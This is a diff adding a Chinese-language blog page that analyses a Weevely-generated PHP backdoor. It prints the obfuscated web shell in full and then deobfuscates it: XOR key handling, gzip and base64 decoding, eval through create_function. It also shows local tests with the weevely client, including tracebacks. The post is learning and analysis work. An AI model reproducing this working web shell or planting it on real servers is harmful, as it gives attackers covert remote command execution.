@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="//cdn.staticfile.org/Primer/21.0.7/primer.css" rel="stylesheet" />
+    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/3468/3468341.png">
+    <script>
+        if(localStorage.getItem("meek_theme")==null){}
+        else if(localStorage.getItem("meek_theme")=="dark"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="dark";}
+        else if(localStorage.getItem("meek_theme")=="light"){document.getElementsByTagName("html")[0].attributes.getNamedItem("data-color-mode").value="light";}
+    </script>
+    
+<meta name="description" content="Weevely Wish">
+<title>Weevely Wish</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">Weevely Wish</h1>
+<div class="title-right">
+    
+    <a href="https://66lueflam144.github.io/realOne81"><button id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd" d="M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z"></path>
+        </svg>
+    </button></a>
+
+    
+    <a href="https://github.com/66lueflam144/realOne81/issues/3" target="_blank"><button class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd" d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+        </svg>
+    </button></a>
+    
+
+    <button class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </button>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p>Last Edited: March 25, 2024 7:28 PM</p>
+<h1>Weevely</h1>
+<p>通过weevely生成php</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
+<span class="pl-s1"><span class="pl-c1">$</span>u</span>=<span class="pl-s">'){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch("/$k8ih8i(.+)$8ik8if8i/",@file_get_contents("p8ihp://8ii8'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>v</span>=<span class="pl-s">'input"),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>h</span>=<span class="pl-s">'t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i"$p$kh$r$kf");}'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>d</span>=str_replace(<span class="pl-s">'D'</span>,<span class="pl-s">''</span>,<span class="pl-s">'cDrDeDaDDte_fuDnction'</span>);
+<span class="pl-s1"><span class="pl-c1">$</span>k</span>=<span class="pl-s">'$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io="";for($i=08i;$i&lt;$l;8i){fo8ir($8ij=0;($j&lt;$c&amp;&amp;$i8i&lt;$l);8i$j+8i+,$i+8i+'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-v">Y</span></span>=<span class="pl-s">'$k="88i8ic319f28";8i$kh8i="d81d1527a8i942"8i;$kf="8e98ia5c2195f5"8i;8i$p="ZnC8it8iZbYs8iDzbbdvRw";8ifunction 8ix($t,8i'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-v">A</span></span>=str_replace(<span class="pl-s">'8i'</span>,<span class="pl-s">''</span>,<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-v">Y</span></span>.<span class="pl-s1"><span class="pl-c1">$</span>k</span>.<span class="pl-s1"><span class="pl-c1">$</span>u</span>.<span class="pl-s1"><span class="pl-c1">$</span>v</span>.<span class="pl-s1"><span class="pl-c1">$</span>h</span>);
+<span class="pl-s1"><span class="pl-c1">$</span>b</span>=<span class="pl-s1"><span class="pl-c1">$</span>d</span>(<span class="pl-s">''</span>,<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-v">A</span></span>);<span class="pl-s1"><span class="pl-c1">$</span>b</span>();
+<span class="pl-ent">?&gt;</span></pre></div>
+<p>进行一点分析</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-ent">&lt;?php</span>
+<span class="pl-c">//第一部分：</span>
+<span class="pl-s1"><span class="pl-c1">$</span>u</span>=<span class="pl-s">'){$o8i.=$t{$i}^$k{$j8i};}8i}re8itu8irn $o;}if (@preg8i_m8iatch("/$k8ih8i(.+)$8ik8if8i/",@file_get_contents("p8ihp://8ii8'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>v</span>=<span class="pl-s">'input"),$m)8i==1) 8i{@o8ib_start()8i;@eva8il8i(@gzuncompre8iss(@x(@8ibas8ie64_de8icode8i($8im[1]8i),8i$k))8i);$o=@ob_ge'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>h</span>=<span class="pl-s">'t_content8is();@ob8i_end_cle8ia8in();$r=8i@ba8ise8i64_encode(@x(@gzco8impr8ies8is(8i$o),$k));prin8it(8i"$p$kh$r$kf");}'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>k</span>=<span class="pl-s">'$k)8i{$c=strlen($k)8i;$8il=st8irlen($t);$8i8i8io="";for($i=08i;$i&lt;$l;8i){fo8ir($8ij=0;($j&lt;$c&amp;&amp;$i8i&lt;$l);8i$j+8i+,$i+8i+'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-v">Y</span></span>=<span class="pl-s">'$k="88i8ic319f28";8i$kh8i="d81d1527a8i942"8i;$kf="8e98ia5c2195f5"8i;8i$p="ZnC8it8iZbYs8iDzbbdvRw";8ifunction 8ix($t,8i'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-v">A</span></span>=str_replace(<span class="pl-s">'8i'</span>,<span class="pl-s">''</span>,<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-v">Y</span></span>.<span class="pl-s1"><span class="pl-c1">$</span>k</span>.<span class="pl-s1"><span class="pl-c1">$</span>u</span>.<span class="pl-s1"><span class="pl-c1">$</span>v</span>.<span class="pl-s1"><span class="pl-c1">$</span>h</span>);
+
+<span class="pl-c">//第二部分</span>
+<span class="pl-s1"><span class="pl-c1">$</span>d</span>=str_replace(<span class="pl-s">'D'</span>,<span class="pl-s">''</span>,<span class="pl-s">'cDrDeDaDDte_fuDnction'</span>);
+<span class="pl-s1"><span class="pl-c1">$</span>b</span>=<span class="pl-s1"><span class="pl-c1">$</span>d</span>(<span class="pl-s">''</span>,<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-v">A</span></span>);
+<span class="pl-s1"><span class="pl-c1">$</span>b</span>();
+<span class="pl-ent">?&gt;</span></pre></div>
+<h1>First Part</h1>
+<p>首先，第一部分的进行替换字符之后，得到</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>k</span>="<span class="pl-s">8c319f28</span>";
+<span class="pl-s1"><span class="pl-c1">$</span>kh</span>="<span class="pl-s">d81d1527a942</span>";
+<span class="pl-s1"><span class="pl-c1">$</span>kf</span>="<span class="pl-s">8e9a5c2195f5</span>";
+<span class="pl-s1"><span class="pl-c1">$</span>p</span>="<span class="pl-s">ZnCtZbYsDzbbdvRw</span>";
+
+<span class="pl-k">function</span> <span class="pl-en">x</span>(<span class="pl-s1"><span class="pl-c1">$</span>t</span>, <span class="pl-s1"><span class="pl-c1">$</span>k</span>) {
+    <span class="pl-s1"><span class="pl-c1">$</span>c</span> = strlen(<span class="pl-s1"><span class="pl-c1">$</span>k</span>);
+    <span class="pl-s1"><span class="pl-c1">$</span>l</span> = strlen(<span class="pl-s1"><span class="pl-c1">$</span>t</span>);
+    <span class="pl-s1"><span class="pl-c1">$</span>o</span> = "";
+
+    for (<span class="pl-s1"><span class="pl-c1">$</span>i</span> = <span class="pl-c1">0</span>; <span class="pl-s1"><span class="pl-c1">$</span>i</span> &lt; <span class="pl-s1"><span class="pl-c1">$</span>l</span>;) {
+        for (<span class="pl-s1"><span class="pl-c1">$</span>j</span> = <span class="pl-c1">0</span>; (<span class="pl-s1"><span class="pl-c1">$</span>j</span> &lt; <span class="pl-s1"><span class="pl-c1">$</span>c</span> &amp;&amp; <span class="pl-s1"><span class="pl-c1">$</span>i</span> &lt; <span class="pl-s1"><span class="pl-c1">$</span>l</span>); <span class="pl-s1"><span class="pl-c1">$</span>j</span>++, <span class="pl-s1"><span class="pl-c1">$</span>i</span>++) {
+            <span class="pl-s1"><span class="pl-c1">$</span>o</span> .= <span class="pl-s1"><span class="pl-c1">$</span>t</span>{<span class="pl-s1"><span class="pl-c1">$</span>i</span>} ^ <span class="pl-s1"><span class="pl-c1">$</span>k</span>{<span class="pl-s1"><span class="pl-c1">$</span>j</span>};
+        }
+    }
+
+    <span class="pl-k">return</span> <span class="pl-s1"><span class="pl-c1">$</span>o</span>;
+}
+
+<span class="pl-k">if</span>(@preg_match("<span class="pl-s">/</span><span class="pl-s1"><span class="pl-c1">$</span>kh</span><span class="pl-s">(.+)</span><span class="pl-s1"><span class="pl-c1">$</span>kf</span><span class="pl-s">/</span>",@file_get_contents("<span class="pl-s">php://input</span>"),<span class="pl-s1"><span class="pl-c1">$</span>m</span>)==<span class="pl-c1">1</span>) {
+	@ob_start();
+	@eval(@gzuncompress(@x(@base64_decode(<span class="pl-s1"><span class="pl-c1">$</span>m</span>[<span class="pl-c1">1</span>]),<span class="pl-s1"><span class="pl-c1">$</span>k</span>)));
+	<span class="pl-s1"><span class="pl-c1">$</span>o</span>=@ob_get_contents();<span class="pl-c">//获取当前缓冲区的内容，并返回缓冲区的数据</span>
+	@ob_end_clean();<span class="pl-c">//停止输出缓冲并清空缓冲区的内容，同时关闭输出缓冲区</span>
+	<span class="pl-s1"><span class="pl-c1">$</span>r</span>=@base64_encode(@x(@gzcompress(<span class="pl-s1"><span class="pl-c1">$</span>o</span>),<span class="pl-s1"><span class="pl-c1">$</span>k</span>));
+	print("<span class="pl-s1"><span class="pl-c1">$</span>p</span><span class="pl-s1"><span class="pl-c1">$</span>kh</span><span class="pl-s1"><span class="pl-c1">$</span>r</span><span class="pl-s1"><span class="pl-c1">$</span>kf</span>");}</pre></div>
+<p>从if语句的部分开始拆分</p>
+<h2><em>@preg_match("/$kh(.+)$kf/",@file_get_contents("php://input"),$m)</em></h2>
+<p><strong>"/$kh(.+)$kf/"</strong></p>
+<ul>
+<li><code class="notranslate">()</code>标记一个子表达式的开始和结束位置。</li>
+<li><code class="notranslate">.</code>匹配除换行符之外的任何单个字符</li>
+<li><code class="notranslate">+</code>匹配前面的子表达式0次或者多次</li>
+</ul>
+<p>写一个例子来理解：</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>k</span> = <span class="pl-s">'cr'</span>;
+<span class="pl-s1"><span class="pl-c1">$</span>s</span> = <span class="pl-s">'ke'</span>;
+
+<span class="pl-s1"><span class="pl-c1">$</span>a</span> = <span class="pl-s">'cream soda you know i like it like that '</span>;
+
+<span class="pl-s1"><span class="pl-c1">$</span>c</span> = preg_match("<span class="pl-s">/</span><span class="pl-s1"><span class="pl-c1">$</span>k</span><span class="pl-s">(.+)</span><span class="pl-s1"><span class="pl-c1">$</span>s</span><span class="pl-s">/</span>", <span class="pl-s1"><span class="pl-c1">$</span>a</span>, <span class="pl-s1"><span class="pl-c1">$</span>cc</span>);
+
+var_dump(<span class="pl-s1"><span class="pl-c1">$</span>cc</span>);
+
+<span class="pl-c">/*结果：</span>
+<span class="pl-c">array(2) {</span>
+<span class="pl-c">  [0] =&gt;</span>
+<span class="pl-c">  string(34) "cream soda you know i like it like"</span>
+<span class="pl-c">  [1] =&gt;</span>
+<span class="pl-c">  string(30) "eam soda you know i like it li"</span>
+<span class="pl-c">}</span>
+<span class="pl-c">*/</span></pre></div>
+<p>所以整个正则表达式的意思其实是：匹配<code class="notranslate">$k</code>开头的<code class="notranslate">$s</code>结尾的，中间的任意的字符串。</p>
+<p>$cc 存储了两个元素:</p>
+<p>• 第一个元素<code class="notranslate">$cc[0]</code>，用来存储按照表达式匹配到的<strong>完整字符串</strong>，也就是***<code class="notranslate">cream soda you know i like it like</code>*<em><em>，可以看到，和原字符串对比，少了结尾的</em>that</em></p>
+<p>• 第二个元素<code class="notranslate">$cc[1]</code>，用来存储<strong>捕获组匹配到的内容</strong>，也就是*<code class="notranslate">eam soda you know i like it li</code><em>，少了开头的</em>cr⇒$k*，结尾的<em>ke⇒$s</em></p>
+<p>所以对于第一句条件 <code class="notranslate">@preg_match**(**"/$kh(.+)$kf/",@file_get_contents**(**"php://input"**)**,$m**)**==1**)**</code> ：</p>
+<ul>
+<li>
+<p>如果在post请求中匹配到 $kh(.+)$kf ，就存入 $m 中</p>
+</li>
+<li>
+<p>然后<strong>ob_start()</strong></p>
+<p>• <strong>ob_start()</strong> 是 PHP 中的一个函数，用于开启输出缓冲。</p>
+<p>• 在 PHP 中，当输出到浏览器或者其他输出目标时，通常是立即发送给客户端的。但有时候，我们可能希望先将输出内容暂时存储起来，等待进一步处理或者在某个时机再发送给客户端，这时就可以使用输出缓冲。</p>
+<p>•<strong>ob_start()</strong> 函数的作用就是开启输出缓冲。</p>
+<p>• 一旦调用了 <strong>ob_start()</strong>，PHP 将会把后续所有的输出都缓冲起来，而不会立即发送到浏览器。</p>
+<p>• 当需要将缓冲内容发送到浏览器时，可以使用 <strong>ob_end_flush()</strong> 或者 <strong>ob_flush()</strong> 函数来完成。</p>
+<p>• 使用输出缓冲的一个常见场景是，当需要在 PHP 脚本中生成一些输出内容，但又希望在输出之前对其进行处理，比如对输出内容进行压缩、修改或者日志记录等操作时。</p>
+</li>
+</ul>
+<h2>2.@gzuncompress和@base64_decode</h2>
+<blockquote>
+<p><strong>@gzuncompress</strong>: 用于解压缩经过gzip压缩的字符串。</p>
+<p><strong>@base64_decode</strong>: 用于对经过base64编码的数据进行解码。</p>
+</blockquote>
+<p><code class="notranslate">$m[1]</code>是捕获组内容，对其进行base64解码，那个$k是上面就定义的那个$k，会传入下一步进行的x函数作为第二个参数（密钥）</p>
+<h2>3.x</h2>
+<p>进行异或操作，用于加密</p>
+<blockquote>
+<p>异或操作有一个特性，就是对同一个值进行两次异或操作，结果还是原来的值。</p>
+</blockquote>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-k">function</span> <span class="pl-en">x</span>(<span class="pl-s1"><span class="pl-c1">$</span>t</span>,<span class="pl-s1"><span class="pl-c1">$</span>k</span>){
+    <span class="pl-s1"><span class="pl-c1">$</span>c</span>=strlen(<span class="pl-s1"><span class="pl-c1">$</span>k</span>);<span class="pl-c">//获取密钥字符串的长度</span>
+    <span class="pl-s1"><span class="pl-c1">$</span>l</span>=strlen(<span class="pl-s1"><span class="pl-c1">$</span>t</span>);<span class="pl-c">//获取输入字符串的长度</span>
+    <span class="pl-s1"><span class="pl-c1">$</span>o</span>="";<span class="pl-c">//初始化一个空字符串 $o 用于存储输出结果</span>
+    for(<span class="pl-s1"><span class="pl-c1">$</span>i</span>=<span class="pl-c1">0</span>;<span class="pl-s1"><span class="pl-c1">$</span>i</span>&lt;<span class="pl-s1"><span class="pl-c1">$</span>l</span>;){<span class="pl-c">//外层循环遍历输入字符串中的每个字符</span>
+        for(<span class="pl-s1"><span class="pl-c1">$</span>j</span>=<span class="pl-c1">0</span>;(<span class="pl-s1"><span class="pl-c1">$</span>j</span>&lt;<span class="pl-s1"><span class="pl-c1">$</span>c</span>&amp;&amp;<span class="pl-s1"><span class="pl-c1">$</span>i</span>&lt;<span class="pl-s1"><span class="pl-c1">$</span>l</span>);<span class="pl-s1"><span class="pl-c1">$</span>j</span>++,<span class="pl-s1"><span class="pl-c1">$</span>i</span>++){<span class="pl-c">//内层循环遍历密钥字符串中的每个字符，并且在每次循环迭代中，</span>
+            <span class="pl-s1"><span class="pl-c1">$</span>o</span>.=<span class="pl-s1"><span class="pl-c1">$</span>t</span>{<span class="pl-s1"><span class="pl-c1">$</span>i</span>}^<span class="pl-s1"><span class="pl-c1">$</span>k</span>{<span class="pl-s1"><span class="pl-c1">$</span>j</span>};<span class="pl-c">//将当前密钥字符与当前输入字符进行按位异或操作，并将结果追加到输出字符串 $o 中</span>
+        }
+    }<span class="pl-k">return</span> <span class="pl-s1"><span class="pl-c1">$</span>o</span>;
+}</pre></div>
+<h2>4.then</h2>
+<p>再往后，会发现$r反方向来了一遍</p>
+<p>先压缩然后x异或操作最后base64编码</p>
+<p>？？？？对缓冲区的内容逆向来一遍？？？</p>
+<h1>Second Part</h1>
+<h2>Lambda_1?</h2>
+<p>在第二部分断点调试的时候看见的</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>d</span>=str_replace(<span class="pl-s">'D'</span>,<span class="pl-s">''</span>,<span class="pl-s">'cDrDeDaDDte_fuDnction'</span>);<span class="pl-c">//替换之后得到create_function</span>
+<span class="pl-s1"><span class="pl-c1">$</span>b</span>=<span class="pl-s1"><span class="pl-c1">$</span>d</span>(<span class="pl-s">''</span>,<span class="pl-s1"><span class="pl-c1">$</span><span class="pl-v">A</span></span>);
+<span class="pl-s1"><span class="pl-c1">$</span>b</span>();</pre></div>
+<p><em><strong><code class="notranslate">create_function</code></strong></em> 是 PHP 中的一个函数，用于动态创建一个匿名函数（lambda 函数）。</p>
+<p>通过 **<em><code class="notranslate">create_function**</code></em> 函数，可以根据传入的参数和代码字符串创建一个匿名函数，并返回一个唯一的函数名。</p>
+<p>这个函数名可以用来调用这个动态创建的函数。</p>
+<p>查了一下官方手册（<a href="https://www.php.net/manual/en/function.create-function.php" rel="nofollow">https://www.php.net/manual/en/function.create-function.php</a>），写了一个demo进行理解</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate"><span class="pl-s1"><span class="pl-c1">$</span>newfunc</span> = create_function(<span class="pl-s">''</span>, <span class="pl-s">'echo "Hello, World!";'</span>);
+<span class="pl-s1"><span class="pl-c1">$</span>newfunc</span>(); <span class="pl-c">// 输出 Hello, World!</span>
+
+<span class="pl-s1"><span class="pl-c1">$</span>func</span> = create_function(<span class="pl-s">'$arg1, $arg2'</span>, <span class="pl-s">''</span>);
+<span class="pl-s1"><span class="pl-c1">$</span>result</span> = <span class="pl-s1"><span class="pl-c1">$</span>func</span>(<span class="pl-c1">1</span>, <span class="pl-c1">2</span>); <span class="pl-c">// 这个调用不会执行任何操作，因为函数体为空</span></pre></div>
+<p>所以第二部分的代码意为：</p>
+<p>通过<code class="notranslate">create_function</code>函数创建一个匿名函数，<code class="notranslate">$args</code>为空，<code class="notranslate">$code</code>来自于<code class="notranslate">$A</code>，最后通过<code class="notranslate">$b()</code>进行调用运行<code class="notranslate">$A</code>中的PHP代码。</p>
+<h1>思路</h1>
+<p>用**<code class="notranslate">$end</code>**来表示<code class="notranslate">@file_get_contents**(**"php://input"**)**</code>获取到的内容，那么整个流程就是：</p>
+<p>1.对**$end** base64解密=&gt;</p>
+<p>2.对**$k<strong>和解密后的</strong>$end**进行异或=&gt;</p>
+<p>3.解压异或后的内容=&gt;</p>
+<p>4.执行（很大可能就是连接shell的代码）=&gt;</p>
+<p>5.得到缓冲区的内容（很大可能代码执行后的返回内容）=&gt;</p>
+<p>6.对返回的内容$o压缩、压缩后的$o和$k进行异或、异或后的内容进行base64 加密=&gt;</p>
+<p>7.将内容打印输出</p>
+<p>then now就陷入？？</p>
+<p>就，输出个什么？</p>
+<p>两个想法：</p>
+<ul>
+<li>查看weevely源码</li>
+<li>修改木马代码进行对比功能</li>
+</ul>
+<h1>6.修改木马代码</h1>
+<h2>未连接</h2>
+<ul>
+<li>当我把解密的代码写入后，执行weevely的连接操作，it works.——就是如果不关病毒防护，会被windows的安全系统隔离。</li>
+<li>当我把$r注释，对应的修改print除去$r，连接失败。⇒<code class="notranslate">Backdoor communication failed, check URL availability and password</code></li>
+</ul>
+<p>搜寻一下：<code class="notranslate">backdoor_unavailable = 'Backdoor communication failed, check URL availability and password'</code></p>
+<h2>已连接</h2>
+<p>当我在连接之后，把$r注释掉，连接并没有断开，但执行whoami无结果返回。</p>
+<p>再取消注释，结果返回成功。</p>
+<h3>如果进一步分解 $r</h3>
+<p>如果<code class="notranslate">$r=gzcompress($o)</code>;——only压缩</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate">**<span class="pl-c1">DESKTOP</span>-<span class="pl-c1">RQS0QA6</span>:<span class="pl-v">C</span>:\<span class="pl-v">Qt</span>\phpstudy_pro\<span class="pl-c1">WWW</span>\nobody\badnews <span class="pl-s1"><span class="pl-c1">$</span> whoami</span>
+<span class="pl-s1"><span class="pl-v">Traceback</span></span> (most recent call last):
+  <span class="pl-v">File</span> "<span class="pl-s">/usr/bin/weevely</span>", line <span class="pl-c1">104</span>, in &lt;module&gt;
+    main(arguments)
+  <span class="pl-v">File</span> "<span class="pl-s">/usr/bin/weevely</span>", line <span class="pl-c1">57</span>, in main
+    <span class="pl-v">Terminal</span>(session).cmdloop()
+  <span class="pl-v">File</span> "<span class="pl-s">/usr/lib/python3.11/cmd.py</span>", line <span class="pl-c1">137</span>, in cmdloop
+    line = self.precmd(line)
+           ^^^^^^^^^^^^^^^^^
+  <span class="pl-v">File</span> "<span class="pl-s">/usr/share/weevely/core/terminal.py</span>", line <span class="pl-c1">236</span>, in precmd
+    modules.loaded[<span class="pl-s">'system_info'</span>].run_argv(["<span class="pl-s">-info</span>", "<span class="pl-s">whoami</span>"])
+  <span class="pl-v">File</span> "/usr/share/weevely/core/module.py"<span class="pl-s">, line 192, in run_argv</span>
+<span class="pl-s">    return self.run()</span>
+<span class="pl-s">           ^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/modules/system/info.py"<span class="pl-s">, line 83, in run</span>
+<span class="pl-s">    result = self.vectors.get_results(</span>
+<span class="pl-s">             ^^^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/core/vectorlist.py"<span class="pl-s">, line 164, in get_results</span>
+<span class="pl-s">    response[vector.name] = vector.run(format_args)</span>
+<span class="pl-s">                            ^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/core/vectors.py"<span class="pl-s">, line 121, in run</span>
+<span class="pl-s">    result = modules.loaded[self.module].run_argv(formatted)</span>
+<span class="pl-s">             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/core/module.py"<span class="pl-s">, line 192, in run_argv</span>
+<span class="pl-s">    return self.run()</span>
+<span class="pl-s">           ^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/modules/shell/php.py"<span class="pl-s">, line 100, in run</span>
+<span class="pl-s">    response, code, error = self.channel.send(command)</span>
+<span class="pl-s">                            ^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/core/channels/channel.py"<span class="pl-s">, line 109, in send</span>
+<span class="pl-s">    response = self.channel_loaded.send(</span>
+<span class="pl-s">               ^^^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/share/weevely/core/channels/obfpost/obfpost.py"<span class="pl-s">, line 110, in send</span>
+<span class="pl-s">    base64.b64decode(matched.group(1)),</span>
+<span class="pl-s">    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span>
+<span class="pl-s">  File </span>"/usr/lib/python3.<span class="pl-c1">11</span>/base64.py", line <span class="pl-c1">88</span>, in b64decode
+    <span class="pl-k">return</span> binascii.a2b_base64(s, strict_mode=validate)**</pre></div>
+<p>可以看到一个执行的过程</p>
+<p><code class="notranslate">argument</code></p>
+<p><strong><code class="notranslate">Terminal(session).cmdloop()</code></strong></p>
+<p><strong><code class="notranslate">line = self.precmd(line)</code></strong></p>
+<p><strong>core/terminal.py：</strong></p>
+<p><strong><code class="notranslate">modules.loaded['system_info'].run_argv(["-info", "whoami"])</code></strong></p>
+<p><strong>core/modules.py：</strong></p>
+<p><strong><code class="notranslate">return self.run()</code></strong></p>
+<p><strong>weevely/modules/system/info.py：</strong></p>
+<p><strong><code class="notranslate">result = self.vectors.get_results(</code></strong></p>
+<p><strong>core/vectorlist.py:</strong></p>
+<p><strong><code class="notranslate">response[vector.name] = vector.run(format_args)</code></strong></p>
+<p><strong>core/vectors.py</strong></p>
+<p><strong><code class="notranslate">result = modules.loaded[self.module].run_argv(formatted)</code></strong></p>
+<p><strong>core/module.py</strong></p>
+<p><strong><code class="notranslate">return self.run()</code></strong></p>
+<p><strong>/modules/shell/php.py</strong></p>
+<p><strong><code class="notranslate">response, code, error = self.channel.send(command)</code></strong></p>
+<p><strong>core/channels/channel.py</strong></p>
+<p><strong><code class="notranslate">response = self.channel_loaded.send(</code></strong></p>
+<p><strong>/core/channels/obfpost/obfpost.py</strong></p>
+<p><strong><code class="notranslate">base64.b64decode(matched.group(1)),</code></strong></p>
+<p><strong>python3.11/base64.py</strong></p>
+<p><strong><code class="notranslate">return binascii.a2b_base64(s, strict_mode=validate)</code></strong></p>
+<p>如果<code class="notranslate">$r = x(gzcompress($o), $k)</code>——only 压缩和异或</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate">weevely&gt; smart
+<span class="pl-s">'smart'</span> �����ڲ����ⲿ���Ҳ���ǿ����еĳ���
+���������ļ���
+<span class="pl-c1">DESKTOP</span>-<span class="pl-c1">RQS0QA6</span>:<span class="pl-v">C</span>:\<span class="pl-v">Qt</span>\phpstudy_pro\<span class="pl-c1">WWW</span>\nobody\badnews <span class="pl-s1"><span class="pl-c1">$</span> whoami</span>
+<span class="pl-s1"><span class="pl-v">Traceback</span></span> (most recent call last):
+  <span class="pl-v">File</span> "<span class="pl-s">/usr/bin/weevely</span>", line <span class="pl-c1">104</span>, in &lt;module&gt;
+    main(arguments)
+  <span class="pl-v">File</span> "<span class="pl-s">/usr/bin/weevely</span>", line <span class="pl-c1">57</span>, in main
+    <span class="pl-v">Terminal</span>(session).cmdloop()
+  <span class="pl-v">File</span> "<span class="pl-s">/usr/lib/python3.11/cmd.py</span>", line <span class="pl-c1">137</span>, in cmdloop
+    line = self.precmd(line)
+           ^^^^^^^^^^^^^^^^^
+  <span class="pl-v">File</span> "<span class="pl-s">/usr/share/weevely/core/terminal.py</span>", line <span class="pl-c1">236</span>, in precmd
+    modules.loaded[<span class="pl-s">'system_info'</span>].run_argv(["<span class="pl-s">-info</span>", "<span class="pl-s">whoami</span>"])
+  <span class="pl-v">File</span> "/usr/share/weevely/core/module.py"<span class="pl-s">, line 192, in run_argv</span>
+<span class="pl-s">    return self.run()</span>
+<span class="pl-s">           ^^^^^^^^^^</span>
